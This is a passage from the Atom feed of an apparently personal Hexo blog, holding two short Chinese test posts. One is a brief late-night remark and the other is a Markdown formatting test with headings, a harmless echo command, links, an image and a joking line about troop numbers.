  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://blog.hatchet.top/posts/d87f7e0c.html"/>
    <id>https://blog.hatchet.top/posts/d87f7e0c.html</id>
    <published>2024-08-24T22:15:58.000Z</published>
    <updated>2024-09-20T12:20:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>不要学我熬夜做东西。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不要学我熬夜做东西。。。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Markdown格式测试</title>
    <link href="https://blog.hatchet.top/posts/db60f10c.html"/>
    <id>https://blog.hatchet.top/posts/db60f10c.html</id>
    <published>2024-08-24T22:00:00.000Z</published>
    <updated>2024-09-21T07:22:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是一级标题">这是一级标题</h1><h2 id="这是二级标题">这是二级标题</h2><h3 id="这是三级标题">这是三级标题</h3><p>正文这么打</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> this is terminal <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/">这是超链接</a></p><p><a href="https://www.baidu.com">https://www.baidu.com</a><br><img src="http://www.wazhishi.com/uploads/allimg/240328/0K453B43-0.jpg"><br>不论怎么讲，会战兵力是八十万对六十万，优势在我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;这是一级标题&quot;&gt;这是一级标题&lt;/h1&gt;
&lt;h2 id=&quot;这是二级标题&quot;&gt;这是二级标题&lt;/h2&gt;
&lt;h3 id=&quot;这是三级标题&quot;&gt;这是三级标题&lt;/h3&gt;
&lt;p&gt;正文这么打&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
